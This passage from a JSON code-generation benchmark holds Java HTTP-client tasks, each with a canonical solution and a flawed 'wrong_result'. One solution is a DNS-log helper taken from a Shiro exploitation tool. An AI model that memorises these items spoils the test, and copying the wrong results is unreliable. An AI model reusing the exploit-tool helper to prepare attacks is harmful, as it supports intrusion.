Exception(conn.getResponseMessage()));\n            } else {\n                this.callback.onSuccess();\n            }\n            conn.disconnect();\n        } catch (IOException e) {\n            this.callback.onFailure(e);\n        }\n    }\n\n    public interface OnRequestCallback {\n        void onSuccess();\n        void onFailure(Exception e);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\ninterface OnRequestCallback {\n    void onSuccess();\n    void onFailure(Exception e);\n}\n\nclass HttpRequestHandler {\n    private String packageName;\n    private OnRequestCallback callback;\n\n    public HttpRequestHandler(String packageName, OnRequestCallback callback) {\n        this.packageName = packageName;\n        this.callback = callback;\n    }\n\n    public void sendPostRequest() {\n        try {\n            URL url = new URL(\"https://example.com/api\");\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"POST\");\n            connection.setConnectTimeout(5000);\n            connection.setReadTimeout(5000);\n            connection.setDoOutput(true);\n            connection.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n\n            String urlParameters = \"packageName=\" + packageName;\n            try (OutputStream os = connection.getOutputStream()) {\n                byte[] input = urlParameters.getBytes(\"utf-8\");\n                os.write(input, 0, input.length);\n            }\n\n            int responseCode = connection.getResponseCode();\n            if (responseCode < 400) {\n                callback.onSuccess();\n            } else {\n                BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getErrorStream()));\n                StringBuilder response = new StringBuilder();\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    response.append(line);\n                }\n                reader.close();\n                callback.onFailure(new Exception(\"HTTP error code: \" + responseCode + \", Response: \" + response.toString()));\n            }\n        } catch (Exception e) {\n            callback.onFailure(e);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 78,
    "Instruction": "Task Description: Implement a Java function that sends an HTTP POST request to a specified URL with a given message, verifies the response status code, and compares the response content with the original message.\n\nFunction Description: The function establishes an HTTP connection using HttpURLConnection, sends a POST request with the provided message as the request body, reads the response, and asserts that the response status code is OK (200) and that the response content matches the original message. If the response doesn't match, it prints the hexadecimal representation of the response.\n\nInput: \n- message: String - The message to be sent in the request body\n- url: String - The endpoint path to which the request is sent (appended to a base URL)\n\nOutput: \n- None (void) - The function performs assertions and may print debug information but doesn't return any value\n- Throws: IOException - If any I/O error occurs during the HTTP communication",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\nprivate void runTestViaJavaImpl(final String message, String url) throws IOException {\n    HttpURLConnection urlcon = null;\n    try {\n        String uri = getBaseUrl() + \"/servletContext/\" + url;\n        urlcon = (HttpURLConnection) new URL(uri).openConnection();\n        urlcon.setInstanceFollowRedirects(true);\n        urlcon.setRequestProperty(\"Connection\", \"close\");\n        urlcon.setRequestMethod(\"POST\");\n        urlcon.setDoInput(true);\n        urlcon.setDoOutput(true);\n        OutputStream os = urlcon.getOutputStream();\n        os.write(message.getBytes());\n        os.close();\n        Assert.assertEquals(StatusCodes.OK, urlcon.getResponseCode());\n        InputStream is = urlcon.getInputStream();\n\n        ByteArrayOutputStream bytes = new ByteArrayOutputStream();\n        byte[] buf = new byte[256];\n        int len;\n        while ((len = is.read(buf)) > 0) {\n            bytes.write(buf, 0, len);\n        }\n        is.close();\n        final String response = new String(bytes.toByteArray(), 0, bytes.size());\n        if (!message.equals(response)) {\n            System.out.println(String.format(\"response=%s\", Hex.encodeHexString(response.getBytes())));\n        }\n        Assert.assertEquals(message, response);\n    } finally {\n        if (urlcon != null) {\n            urlcon.disconnect();\n        }\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpPostClient {\n    public static void sendPostRequest(String message, String url) throws IOException {\n        URL endpoint = new URL(\"http://example.com\" + url);\n        HttpURLConnection connection = (HttpURLConnection) endpoint.openConnection();\n        connection.setRequestMethod(\"POST\");\n        connection.setDoOutput(true);\n        connection.setRequestProperty(\"Content-Type\", \"application/json; utf-8\");\n        connection.setRequestProperty(\"Accept\", \"application/json\");\n\n        try (OutputStream os = connection.getOutputStream()) {\n            byte[] input = message.getBytes(\"utf-8\");\n            os.write(input, 0, input.length);\n        }\n\n        int responseCode = connection.getResponseCode();\n        if (responseCode != HttpURLConnection.HTTP_OK) {\n            throw new IOException(\"HTTP response code: \" + responseCode);\n        }\n\n        StringBuilder response = new StringBuilder();\n        try (BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream(), \"utf-8\"))) {\n            String responseLine;\n            while ((responseLine = br.readLine()) != null) {\n                response.append(responseLine.trim());\n            }\n        }\n\n        if (!response.toString().equals(message)) {\n            StringBuilder hexResponse = new StringBuilder();\n            for (byte b : response.toString().getBytes(\"utf-8\")) {\n                hexResponse.append(String.format(\"%02X \", b));\n            }\n            System.out.println(\"Response does not match. Hex dump: \" + hexResponse.toString().trim());\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 80,
    "Instruction": "Task Description: Create a Java class that implements a REST client using HttpURLConnection for making HTTP requests with support for authentication, headers, and parameters.\n\nClass Description: The RestClient class provides functionality to send HTTP requests to a specified server with configurable protocol, host, port, and authentication. It supports various HTTP methods, request parameters, headers, and handles response processing.\n\nAttributes:\n- protocol: [Protocol] - The protocol to use (HTTP/HTTPS)\n- host: [String] - The hostname or IP address of the server\n- port: [int] - The port number of the server\n- username: [String] - The username for basic authentication (nullable)\n- password: [String] - The password for basic authentication (nullable)\n\nMethods:\n- getUrl: [String path, Param... param] -> [URL] - Constructs a complete URL from path and parameters\n- send: [Method method, String path, Option[] options, StreamConsumer outStreamConsumer] -> [CompletableFuture<Response>] - Sends an HTTP request asynchronously and returns a future containing the response\n- tryGetResponseTextFrom: [HttpURLConnection conn, int status] -> [String] - Reads the response text from the connection\n- getResponseCodeFrom: [HttpURLConnection conn] -> [int] - Gets the response code from the connection, handling 404 specifically\n\nHelper Interfaces/Classes:\n- StreamConsumer: Functional interface for writing to output streams\n- SingletonIterator: Utility iterator for single-element collections\n- Response: Contains status code, response text, and headers (implied but not shown in code)\n- RestException: Custom exception for REST-related errors (implied but not shown in code)",
    "Canonical_solution": "import java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Base64;\nimport java.util.Iterator;\nimport java.util.NoSuchElementException;\nimport java.util.Objects;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.function.Consumer;\nimport java.util.stream.Stream;\n\nfinal class RestClient {\n\n    private static final int BUFFER_SIZE = 1024;\n    private static final Iterator<String> NO_ITERATOR = new Iterator<String>() {\n        @Override\n        public boolean hasNext() { return false; }\n\n        @Override\n        public String next() {\n            throw new NoSuchElementException(\"This method should never be called.\");\n        }\n    };\n\n    private final Protocol protocol;\n    private final String host;\n    private final int port;\n    private final String username;\n    private final String password;\n\n    RestClient(Protocol protocol, String host, int port, String username, String password) {\n        this.protocol = Objects.requireNonNull(protocol);\n        this.host     = Objects.requireNonNull(host);\n        this.port     = port;\n        this.username = username;\n        this.password = password;\n    }\n\n    protected URL getUrl(String path, Param... param) {\n        final StringBuilder url = new StringBuilder()\n            .append(getProtocol())\n            .append(\"://\")\n            .append(host);\n\n        if (port > 0) {\n            url.append(\":\").append(port);\n        }\n\n        url.append(\"/\").append(path);\n\n        if (param.length > 0) {\n            url.append(\n                Stream.of(param)\n                    .map(p -> encode(p.getKey()) + \"=\" + encode(p.getValue()))\n                    .collect(joining(\"&\", \"?\", \"\"))\n            );\n        }\n\n        try {\n            return new URL(url.toString());\n        } catch (Exception ex) {\n            throw new IllegalArgumentException(\"Error building URL\", ex);\n        }\n    }\n\n    private CompletableFuture<Response> send(Method method, String path, Option[] options, StreamConsumer outStreamConsumer) {\n        return CompletableFuture.supplyAsync(() -> {\n            HttpURLConnection conn = null;\n            try {\n                final Param[] params = Stream.of(options)\n                    .filter(o -> o.getType() == PARAM)\n                    .map(Param.class::cast)\n                    .toArray(Param[]::new);\n                \n                final Header[] headers = Stream.of(options)\n                    .filter(o -> o.getType() == HEADER)\n                    .map(Header.class::cast)\n                    .toArray(Header[]::new);\n                \n                conn = (HttpURLConnection) getUrl(path, params).openConnection();\n                conn.setRequestMethod(method.name());\n                conn.setUseCaches(false);\n                conn.setAllowUserInteraction(false);\n\n                if (username != null && password != null) {\n                    final String encoding = Base64.getEncoder()\n                        .encodeToString((username + \":\" + password).getBytes());\n                    conn.setRequestProperty(\"Authorization\", \"Basic \" + encoding);\n                }\n\n                for (final Header header : headers) {\n                    conn.setRequestProperty(header.getKey(), header.getValue());\n                }\n\n                final boolean doOutput = outStreamConsumer != IGNORE;\n                conn.setDoOutput(doOutput);\n                conn.connect();\n\n                if (doOutput) {\n                    try (OutputStream out = conn.getOutputStream()) {\n                        outStreamConsumer.writeTo(out);\n                        out.flush();\n                    }\n                }\n\n                int status = getResponseCodeFrom(conn);\n                String text = tryGetResponseTextFrom(conn, status);\n                return new Response(status, text, conn.getHeaderFields());\n            } catch (Exception ex) {\n                throw new RestException(ex, protocol, method, username, host, port, path, options);\n            } finally {\n                if (conn != null) conn.disconnect();\n            }\n        });\n    }\n\n    private static String tryGetResponseTextFrom(HttpURLConnection conn, int status) throws IOException {\n        try (BufferedReader rd = new BufferedReader(\n            new InputStreamReader(status >= 400 \n                ? conn.getErrorStream() \n                : conn.getInputStream()))) {\n            \n            StringBuilder sb = new StringBuilder();\n            String line;\n            while ((line = rd.readLine()) != null) {\n                sb.append(line);\n            }\n            return sb.toString();\n        }\n    }\n\n    private static int getResponseCodeFrom(HttpURLConnection conn) throws IOException {\n        try {\n            return conn.getResponseCode();\n        } catch (FileNotFoundException ex) {\n            return 404;\n        }\n    }\n\n    @FunctionalInterface\n    private interface StreamConsumer {\n        void writeTo(OutputStream out) throws IOException;\n    }\n\n    private static final class SingletonIterator<E> implements Iterator<E> {\n        private final E e;\n        private boolean hasNext = true;\n\n        private SingletonIterator(E e) { this.e = e; }\n\n        public boolean hasNext() { return hasNext; }\n\n        public E next() {\n            if (hasNext) {\n                hasNext = false;\n                return e;\n            }\n            throw new NoSuchElementException();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class RestClient {\n    private final String protocol;\n    private final String host;\n    private final int port;\n    private final String username;\n    private final String password;\n\n    public RestClient(String protocol, String host, int port, String username, String password) {\n        this.protocol = protocol;\n        this.host = host;\n        this.port = port;\n        this.username = username;\n        this.password = password;\n    }\n\n    public URL getUrl(String path, Param... params) throws Exception {\n        StringBuilder urlBuilder = new StringBuilder(protocol + \"://\" + host + \":\" + port + path);\n        if (params.length > 0) {\n            urlBuilder.append(\"?\");\n            for (int i = 0; i < params.length; i++) {\n                if (i > 0) urlBuilder.append(\"&\");\n                urlBuilder.append(params[i].getKey()).append(\"=\").append(URLEncoder.encode(params[i].getValue(), \"UTF-8\"));\n            }\n        }\n        return new URL(urlBuilder.toString());\n    }\n\n    public CompletableFuture<Response> send(Method method, String path, Option[] options, StreamConsumer outStreamConsumer) {\n        CompletableFuture<Response> future = new CompletableFuture<>();\n        try {\n            URL url = getUrl(path, (Param[]) Arrays.stream(options).filter(o -> o.getType() == Param.Type.PARAMETER).map(Option::getValue).toArray(Param[]::new));\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(method.name());\n            if (username != null && password != null) {\n                String auth = username + \":\" + password;\n                String encodedAuth = Base64.getEncoder().encodeToString(auth.getBytes(StandardCharsets.UTF_8));\n                conn.setRequestProperty(\"Authorization\", \"Basic \" + encodedAuth);\n            }\n            for (Option option : options) {\n                if (option.getType() == Option.Type.HEADER) {\n                    String[] headerParts = option.getValue().split(\":\", 2);\n                    if (headerParts.length == 2) {\n                        conn.setRequestProperty(headerParts[0].trim(), headerParts[1].trim());\n                    }\n                }\n            }\n            if (outStreamConsumer != null) {\n                conn.setDoOutput(true);\n                try (OutputStream os = conn.getOutputStream(); OutputStreamWriter osw = new OutputStreamWriter(os)) {\n                    outStreamConsumer.accept(osw);\n                }\n            }\n            int responseCode = getResponseCodeFrom(conn);\n            String responseText = tryGetResponseTextFrom(conn, responseCode);\n            future.complete(new Response(responseCode, responseText, getHeaders(conn)));\n        } catch (Exception e) {\n            future.completeExceptionally(new RestException(e));\n        }\n        return future;\n    }\n\n    private String tryGetResponseTextFrom(HttpURLConnection conn, int status) throws IOException {\n        if (status >= 200 && status < 300) {\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {\n                StringBuilder response = new StringBuilder();\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    response.append(line);\n                }\n                return response.toString();\n            }\n        } else {\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getErrorStream()))) {\n                StringBuilder response = new StringBuilder();\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    response.append(line);\n                }\n                return response.toString();\n            }\n        }\n    }\n\n    private int getResponseCodeFrom(HttpURLConnection conn) throws IOException {\n        try {\n            return conn.getResponseCode();\n        } catch (IOException e) {\n            if (e.getMessage().contains(\"HTTP/1.1 404\")) {\n                return 404;\n            }\n            throw e;\n        }\n    }\n\n    private Map<String, List<String>> getHeaders(HttpURLConnection conn) {\n        Map<String, List<String>> headers = new HashMap<>();\n        for (Map.Entry<String, List<String>> entry : conn.getHeaderFields().entrySet()) {\n            headers.put(entry.getKey(), new ArrayList<>(entry.getValue()));\n        }\n        return headers;\n    }\n\n    public enum Method {\n        GET, POST, PUT, DELETE\n    }\n\n    public static class Param {\n        public enum Type {\n            PARAMETER, HEADER\n        }\n\n        private final Type type;\n        private final String key;\n        private final String value;\n\n        public Param(Type type, String key, String value) {\n            this.type = type;\n            this.key = key;\n            this.value = value;\n        }\n\n        public Type getType() {\n            return type;\n        }\n\n        public String getKey() {\n            return key;\n        }\n\n        public String getValue() {\n            return value;\n        }\n    }\n\n    public static class Option {\n        public enum Type {\n            HEADER, PARAMETER\n        }\n\n        private final Type type;\n        private final String value;\n\n        public Option(Type type, String value) {\n            this.type = type;\n            this.value = value;\n        }\n\n        public Type getType() {\n            return type;\n        }\n\n        public String getValue() {\n            return value;\n        }\n    }\n\n    public interface StreamConsumer {\n        void accept(OutputStreamWriter writer) throws IOException;\n    }\n\n    public static class SingletonIterator<T> implements Iterator<T> {\n        private final T item;\n        private boolean hasNext = true;\n\n        public SingletonIterator(T item) {\n            this.item = item;\n        }\n\n        @Override\n        public boolean hasNext() {\n            return hasNext;\n        }\n\n        @Override\n        public T next() {\n            if (!hasNext) {\n                throw new NoSuchElementException();\n            }\n            hasNext = false;\n            return item;\n        }\n    }\n\n    public static class Response {\n        private final int statusCode;\n        private final String text;\n        private final Map<String, List<String>> headers;\n\n        public Response(int statusCode, String text, Map<String, List<String>> headers) {\n            this.statusCode = statusCode;\n            this.text = text;\n            this.headers = headers;\n        }\n\n        public int getStatusCode() {\n            return statusCode;\n        }\n\n        public String getText() {\n            return text;\n        }\n\n        public Map<String, List<String>> getHeaders() {\n            return headers;\n        }\n    }\n\n    public static class RestException extends Exception {\n        public RestException(Throwable cause) {\n            super(cause);\n        }\n    }\n}"
  },
  {
    "Task_id": 81,
    "Instruction": "Task Description: Create a Java class that interacts with a DNS log service to retrieve a domain and session information for tracking DNS requests.\n\nClass Description: The GetDNSLogRecordTask class is responsible for making an HTTP GET request to a DNS log service (dnslog.cn) to obtain a temporary domain and session cookie. It stores the retrieved information in a configuration object and tracks the operation's status.\n\nAttributes:\n- status: int - Tracks the execution status of the task (1 for success, -1 for failure)\n- config: Config - Configuration object where DNS log information will be stored\n\nMethods:\n- GetDNSLogRecordTask(Config config) -> None - Constructor that initializes the class with a configuration object\n- getStatus() -> int - Returns the current status of the task\n- execute() -> Integer - Performs the HTTP request to get DNS log information and returns 1 regardless of success/failure (legacy behavior)",
    "Canonical_solution": "import com.shiroexploit.util.Config;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class GetDNSLogRecordTask {\n\n    private int status = 0;\n    private Config config;\n\n    public GetDNSLogRecordTask(Config config){\n        this.config = config;\n    }\n\n    public int getStatus(){\n        return status;\n    }\n\n    public Integer execute() {\n        HttpURLConnection connection = null;\n        InputStream inputStream = null;\n        BufferedReader reader = null;\n        StringBuffer sb = new StringBuffer();\n\n        try {\n            connection = (HttpURLConnection)new URL(\"http://www.dnslog.cn/getdomain.php\").openConnection();\n            connection.setRequestMethod(\"GET\");\n            connection.setConnectTimeout(5000);\n            connection.setReadTimeout(5000);\n            connection.connect();\n\n            int responseCode = connection.getResponseCode();\n            if (responseCode == 200) {\n                String sessinoId = connection.getHeaderField(\"Set-Cookie\");\n                sessinoId = sessinoId.split(\";\")[0];\n\n                inputStream = connection.getInputStream();\n                reader = new BufferedReader(new InputStreamReader(inputStream));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    sb.append(line);\n                }\n\n                Config.getInstance().setSessionId(sessinoId);\n                Config.getInstance().setDnsLogRecord(sb.toString());\n                status = 1;\n                return 1;\n            }\n        }\n        catch (IOException e) {\n            status = -1;\n            return 1;\n        } finally {\n            try {\n                if (connection != null) connection.disconnect();\n                if (inputStream != null) inputStream.close();\n                if (reader != null) reader.close();\n            } catch (IOException e) {\n                status = -1;\n                return 1;\n            }\n        }\n\n        status = -1;\n        return 1;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class GetDNSLogRecordTask {\n    private int status;\n    private Config config;\n\n    public GetDNSLogRecordTask(Config config) {\n        this.config = config;\n        this.status = -1;\n    }\n\n    public int getStatus() {\n        return status;\n    }\n\n    public Integer execute() {\n        try {\n            String url = \"https://dnslog.cn/get.php\";\n            java.net.URL obj = new java.net.URL(url);\n            java.net.HttpURLConnection con = (java.net.HttpURLConnection) obj.openConnection();\n            con.setRequestMethod(\"GET\");\n            int responseCode = con.getResponseCode();\n            if (responseCode == 200) {\n                java.io.BufferedReader in = new java.io.BufferedReader(new java.io.InputStreamReader(con.getInputStream()));\n                String inputLine;\n                StringBuilder response = new StringBuilder();\n                while ((inputLine = in.readLine()) != null) {\n                    response.append(inputLine);\n                }\n                in.close();\n                String[] parts = response.toString().split(\",\");\n                if (parts.length >= 2) {\n                    config.setDomain(parts[0]);\n                    config.setSessionCookie(parts[1]);\n                    status = 1;\n                }\n            }\n        } catch (Exception e) {\n            status = -1;\n        }\n        return 1;\n    }\n}"
  },
  {
    "Task_id": 82,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests asynchronously in an Android environment, using HttpURLConnection for network operations and AsyncTask for background processing.\n\nClass Description: HttpRequestHandler is a utility class designed to perform HTTP GET requests asynchronously. It contains an inner AsyncTask class for background network operations and a helper method for converting InputStream to String.\n\nAttributes: (None - this is a utility class with no instance attributes)\n\nMethods:\n\nMethod1: MyAsyncTaskgetNews(String... params) -> String - An AsyncTask subclass that performs HTTP GET requests in the background. Takes a URL string as input and processes the response.\n  - onPreExecute(): void - Empty preparation method (can be overridden)\n  - doInBackground(String...): String - Performs the network request, reads response, and publishes progress\n  - onProgressUpdate(String...): void - Shows the response in a Toast message\n  - onPostExecute(String): void - Empty completion method (can be overridden)\n\nMethod2: ConvertInputToStringNoChange(InputStream) -> String - Helper method that converts an InputStream to a String by reading all lines.\n  - Input: InputStream - The input stream to convert\n  - Output: String - The concatenated string from the input stream",
    "Canonical_solution": "import android.content.Intent;\nimport android.os.AsyncTask;\nimport android.widget.Toast;\n\nimport java.io.BufferedInputStream;\nimport java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpRequestHandler {\n\n    public static class MyAsyncTaskgetNews extends AsyncTask<String, String, String> {\n        @Override\n        protected void onPreExecute() {\n            //before works\n        }\n\n        @Override\n        protected String doInBackground(String... params) {\n            try {\n                String NewsData;\n                URL url = new URL(params[0]);\n                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();\n                urlConnection.setConnectTimeout(7000);\n\n                try {\n                    InputStream in = new BufferedInputStream(urlConnection.getInputStream());\n                    NewsData = ConvertInputToStringNoChange(in);\n                    publishProgress(NewsData);\n                } finally {\n                    urlConnection.disconnect();\n                }\n            } catch (Exception ex) {}\n            return null;\n        }\n\n        protected void onProgressUpdate(String... progress) {\n            try {\n                Toast.makeText(getApplicationContext(), progress[0], Toast.LENGTH_LONG).show();\n            } catch (Exception ex) {}\n        }\n\n        protected void onPostExecute(String result2) {}\n    }\n\n    public static String ConvertInputToStringNoChange(InputStream inputStream) {\n        BufferedReader bureader = new BufferedReader(new InputStreamReader(inputStream));\n        String line;\n        String linereultcal = \"\";\n\n        try {\n            while ((line = bureader.readLine()) != null) {\n                linereultcal += line;\n            }\n            inputStream.close();\n        } catch (Exception ex) {}\n\n        return linereultcal;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport android.os.AsyncTask;\nimport android.widget.Toast;\nimport java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpRequestHandler {\n    private static class MyAsyncTask extends AsyncTask<String, String, String> {\n        @Override\n        protected void onPreExecute() {\n            super.onPreExecute();\n        }\n\n        @Override\n        protected String doInBackground(String... params) {\n            String url = params[0];\n            try {\n                URL uri = new URL(url);\n                HttpURLConnection connection = (HttpURLConnection) uri.openConnection();\n                connection.setRequestMethod(\"GET\");\n                connection.setConnectTimeout(5000);\n                connection.setReadTimeout(5000);\n                connection.connect();\n\n                int responseCode = connection.getResponseCode();\n                if (responseCode == HttpURLConnection.HTTP_OK) {\n                    InputStream inputStream = connection.getInputStream();\n                    String result = convertInputToStringNoChange(inputStream);\n                    publishProgress(result);\n                }\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n            return null;\n        }\n\n        @Override\n        protected void onProgressUpdate(String... values) {\n            super.onProgressUpdate(values);\n            Toast.makeText(null, values[0], Toast.LENGTH_SHORT).show();\n        }\n\n        @Override\n        protected void onPostExecute(String result) {\n            super.onPostExecute(result);\n        }\n    }\n\n    public static String convertInputToStringNoChange(InputStream inputStream) {\n        StringBuilder stringBuilder = new StringBuilder();\n        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));\n        String line;\n        try {\n            while ((line = bufferedReader.readLine()) != null) {\n                stringBuilder.append(line);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                inputStream.close();\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n        return stringBuilder.toString();\n    }\n\n    public static void getNews(String... params) {\n        new MyAsyncTask().execute(params);\n    }\n}\n```"
  },
  {
    "Task_id": 84,
    "Instruction": "Task Description: Create a Java utility class for making HTTP POST requests with JSON payloads, handling authentication, and processing JSON responses.\n\nClass Description: JobRemotingUtil is a utility class that provides functionality for making remote HTTP POST requests with JSON data. It handles connection setup, request configuration, payload serialization, response processing, and error handling. The class includes logging capabilities and supports access token authentication.\n\nAttributes:\nlogger: [Logger] - SLF4J logger instance for logging errors and debug information\nXXL_RPC_ACCESS_TOKEN: [String] - Constant string for the authentication token header name\n\nMethods:\npostBody: [Name](String url, String accessToken, Object requestObj, int timeout) -> ReturnT<String> - Makes an HTTP POST request to the specified URL with the given request object serialized as JSON. Handles authentication via access token, sets appropriate headers, and processes the JSON response. Returns a ReturnT<String> object containing the response status, message, and content. The timeout parameter specifies the read timeout in seconds.",
    "Canonical_solution": "import com.wugui.datatx.core.biz.model.ReturnT;\nimport com.wugui.datax.rpc.util.json.BasicJson;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\n\npublic class JobRemotingUtil {\n    private static Logger logger = LoggerFactory.getLogger(JobRemotingUtil.class);\n    public static String XXL_RPC_ACCESS_TOKEN = \"XXL-RPC-ACCESS-TOKEN\";\n\n    public static ReturnT<String> postBody(String url, String accessToken, Object requestObj, int timeout) {\n        HttpURLConnection connection = null;\n        BufferedReader bufferedReader = null;\n        try {\n            URL realUrl = new URL(url);\n            connection = (HttpURLConnection) realUrl.openConnection();\n\n            connection.setRequestMethod(\"POST\");\n            connection.setDoOutput(true);\n            connection.setDoInput(true);\n            connection.setUseCaches(false);\n            connection.setReadTimeout(timeout * 1000);\n            connection.setConnectTimeout(3 * 1000);\n            connection.setRequestProperty(\"connection\", \"Keep-Alive\");\n            connection.setRequestProperty(\"Content-Type\", \"application/json;charset=UTF-8\");\n            connection.setRequestProperty(\"Accept-Charset\", \"application/json;charset=UTF-8\");\n\n            if(accessToken!=null && accessToken.trim().length()>0){\n                connection.setRequestProperty(XXL_RPC_ACCESS_TOKEN, accessToken);\n            }\n\n            connection.connect();\n\n            String requestBody = BasicJson.toJson(requestObj);\n            DataOutputStream dataOutputStream = new DataOutputStream(connection.getOutputStream());\n            dataOutputStream.writeBytes(requestBody);\n            dataOutputStream.flush();\n            dataOutputStream.close();\n\n            int statusCode = connection.getResponseCode();\n            if (statusCode != 200) {\n                return new ReturnT<String>(ReturnT.FAIL_CODE, \"xxl-rpc remoting fail, StatusCode(\"+ statusCode +\") invalid. for url : \" + url);\n            }\n\n            bufferedReader = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            StringBuilder result = new StringBuilder();\n            String line;\n            while ((line = bufferedReader.readLine()) != null) {\n                result.append(line);\n            }\n            String resultJson = result.toString();\n\n            try {\n                Map<String, Object> resultMap = BasicJson.parseMap(resultJson);\n\n                ReturnT<String> returnT = new ReturnT<String>();\n                if (resultMap==null) {\n                    returnT.setCode(ReturnT.FAIL_CODE);\n                    returnT.setMsg(\"AdminBizClient Remoting call fail.\");\n                } else {\n                    returnT.setCode(Integer.valueOf(String.valueOf(resultMap.get(\"code\"))));\n                    returnT.setMsg(String.valueOf(resultMap.get(\"msg\")));\n                    returnT.setContent(String.valueOf(resultMap.get(\"content\")));\n                }\n                return returnT;\n            } catch (Exception e) {\n                logger.error(\"xxl-rpc remoting (url=\"+url+\") response content invalid(\"+ resultJson +\").\", e);\n                return new ReturnT<String>(ReturnT.FAIL_CODE, \"xxl-rpc remoting (url=\"+url+\") response content invalid(\"+ resultJson +\").\");\n            }\n\n        } catch (Exception e) {\n            logger.error(e.getMessage(), e);\n            return new ReturnT<String>(ReturnT.FAIL_CODE, \"xxl-rpc remoting error(\"+ e.getMessage() +\"), for url : \" + url);\n        } finally {\n            try {\n                if (bufferedReader != null) {\n                    bufferedReader.close();\n                }\n                if (connection != null) {\n                    connection.disconnect();\n                }\n            } catch (Exception e2) {\n                logger.error(e2.getMessage(), e2);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport com.alibaba.fastjson.JSON;\nimport com.alibaba.fastjson.JSONObject;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.nio.charset.StandardCharsets;\n\npublic class JobRemotingUtil {\n    private static final Logger logger = LoggerFactory.getLogger(JobRemotingUtil.class);\n    private static final String XXL_RPC_ACCESS_TOKEN = \"XXL-RPC-ACCESS-TOKEN\";\n\n    public static ReturnT<String> postBody(String url, String accessToken, Object requestObj, int timeout) {\n        try {\n            URL obj = new URL(url);\n            HttpURLConnection con = (HttpURLConnection) obj.openConnection();\n            con.setRequestMethod(\"POST\");\n            con.setConnectTimeout(timeout * 1000);\n            con.setReadTimeout(timeout * 1000);\n            con.setRequestProperty(\"Content-Type\", \"application/json; utf-8\");\n            con.setRequestProperty(\"Accept\", \"application/json\");\n            con.setRequestProperty(XXL_RPC_ACCESS_TOKEN, accessToken);\n            con.setDoOutput(true);\n\n            String jsonInputString = JSON.toJSONString(requestObj);\n            byte[] inputBytes = jsonInputString.getBytes(StandardCharsets.UTF_8);\n            con.getOutputStream().write(inputBytes, 0, inputBytes.length);\n\n            int responseCode = con.getResponseCode();\n            StringBuilder response = new StringBuilder();\n            try (BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream(), StandardCharsets.UTF_8))) {\n                String line;\n                while ((line = in.readLine()) != null) {\n                    response.append(line);\n                }\n            }\n\n            JSONObject jsonResponse = JSON.parseObject(response.toString());\n            return new ReturnT<>(responseCode, \"OK\", jsonResponse.toJSONString());\n        } catch (Exception e) {\n            logger.error(\"HTTP POST request failed\", e);\n            return new ReturnT<>(-1, \"Error: \" + e.getMessage(), null);\n        }\n    }\n\n    static class ReturnT<T> {\n        private int code;\n        private String msg;\n        private T content;\n\n        public ReturnT(int code, String msg, T content) {\n            this.code = code;\n            this.msg = msg;\n            this.content = content;\n        }\n\n        public int getCode() {\n            return code;\n        }\n\n        public String getMsg() {\n            return msg;\n        }\n\n        public T getContent() {\n            return content;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 85,
